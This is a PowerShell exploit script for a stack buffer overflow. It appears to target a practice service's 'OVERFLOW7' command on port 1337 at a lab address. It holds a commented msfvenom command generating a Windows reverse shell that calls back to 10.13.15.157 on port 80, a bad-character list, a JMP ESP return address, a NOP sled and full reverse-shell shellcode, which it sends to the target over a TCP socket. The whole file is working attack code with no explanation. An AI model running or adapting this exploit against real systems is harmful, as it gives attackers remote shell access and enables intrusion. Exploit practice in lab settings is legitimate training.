<# badchars
    \x00\x8c\xae\xbe\xfb
#>

<# msfvenom command
    msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.13.15.157 LPORT=80 EXITFUNC=process \
    -f powershell -a x86 -b '\x00\x8c\xae\xbe\xfb'
#>

$IP = '10.10.24.242'
$port = 1337
[byte[]][char[]]$function = 'OVERFLOW7 '
[byte[]][char[]]$fuzz = 'A' * 1306 # + 'PWNZ'
#[byte[]]$badChars = 0x00,0x8c,0xae,0xbe,0xfb
#[byte[]]$testChars = 0..255 | Where-Object { $_ -notin $badChars }
[byte[]]$jmpEsp = 0xaf,0x11,0x50,0x62 # 625011AF Little endian
[byte[]]$nopSled = @(0x90) * 32
[byte[]]$shellcode = 0x31,0xc9,0x83,0xe9,0xaf,0xe8,0xff,0xff,0xff,0xff,0xc0,0x5e,0x81,0x76,0xe,0x15,0xfc,0xf,0x3d,0x83,0xee,0xfc,0xe2,0xf4,0xe9,0x14,0x8d,0x3d,0x15,0xfc,0x6f,0xb4,0xf0,0xcd,0xcf,0x59,0x9e,0xac,0x3f,0xb6,0x47,0xf0,0x84,0x6f,0x1,0x77,0x7d,0x15,0x1a,0x4b,0x45,0x1b,0x24,0x3,0xa3,0x1,0x74,0x80,0xd,0x11,0x35,0x3d,0xc0,0x30,0x14,0x3b,0xed,0xcf,0x47,0xab,0x84,0x6f,0x5,0x77,0x45,0x1,0x9e,0xb0,0x1e,0x45,0xf6,0xb4,0xe,0xec,0x44,0x77,0x56,0x1d,0x14,0x2f,0x84,0x74,0xd,0x1f,0x35,0x74,0x9e,0xc8,0x84,0x3c,0xc3,0xcd,0xf0,0x91,0xd4,0x33,0x2,0x3c,0xd2,0xc4,0xef,0x48,0xe3,0xff,0x72,0xc5,0x2e,0x81,0x2b,0x48,0xf1,0xa4,0x84,0x65,0x31,0xfd,0xdc,0x5b,0x9e,0xf0,0x44,0xb6,0x4d,0xe0,0xe,0xee,0x9e,0xf8,0x84,0x3c,0xc5,0x75,0x4b,0x19,0x31,0xa7,0x54,0x5c,0x4c,0xa6,0x5e,0xc2,0xf5,0xa3,0x50,0x67,0x9e,0xee,0xe4,0xb0,0x48,0x94,0x3c,0xf,0x15,0xfc,0x67,0x4a,0x66,0xce,0x50,0x69,0x7d,0xb0,0x78,0x1b,0x12,0x3,0xda,0x85,0x85,0xfd,0xf,0x3d,0x3c,0x38,0x5b,0x6d,0x7d,0xd5,0x8f,0x56,0x15,0x3,0xda,0x6d,0x45,0xac,0x5f,0x7d,0x45,0xbc,0x5f,0x55,0xff,0xf3,0xd0,0xdd,0xea,0x29,0x98,0x57,0x10,0x94,0x5,0x30,0x1a,0x61,0x67,0x3f,0x15,0xfc,0x5f,0xb4,0xf3,0x96,0x1f,0x6b,0x42,0x94,0x96,0x98,0x61,0x9d,0xf0,0xe8,0x90,0x3c,0x7b,0x31,0xea,0xb2,0x7,0x48,0xf9,0x94,0xff,0x88,0xb7,0xaa,0xf0,0xe8,0x7d,0x9f,0x62,0x59,0x15,0x75,0xec,0x6a,0x42,0xab,0x3e,0xcb,0x7f,0xee,0x56,0x6b,0xf7,0x1,0x69,0xfa,0x51,0xd8,0x33,0x3c,0x14,0x71,0x4b,0x19,0x5,0x3a,0xf,0x79,0x41,0xac,0x59,0x6b,0x43,0xba,0x59,0x73,0x43,0xaa,0x5c,0x6b,0x7d,0x85,0xc3,0x2,0x93,0x3,0xda,0xb4,0xf5,0xb2,0x59,0x7b,0xea,0xcc,0x67,0x35,0x92,0xe1,0x6f,0xc2,0xc0,0x47,0xff,0x88,0xb7,0xaa,0x67,0x9b,0x80,0x41,0x92,0xc2,0xc0,0xc0,0x9,0x41,0x1f,0x7c,0xf4,0xdd,0x60,0xf9,0xb4,0x7a,0x6,0x8e,0x60,0x57,0x15,0xaf,0xf0,0xe8
$pwnz = $function + $fuzz + $jmpEsp + $nopSled + $shellcode

$socket = [System.Net.Sockets.TcpClient]::new()

try {
    $socket.Connect($IP, $port)
}
catch {
    $socket.Close()
    $socket.Dispose()
    throw $_.Exception
}

try {
    $socket.Client.Send($pwnz)
    $socket.Close()
    $socket.Dispose()
}
catch {
    $socket.Close()
    $socket.Dispose()
    throw $_.Exception
}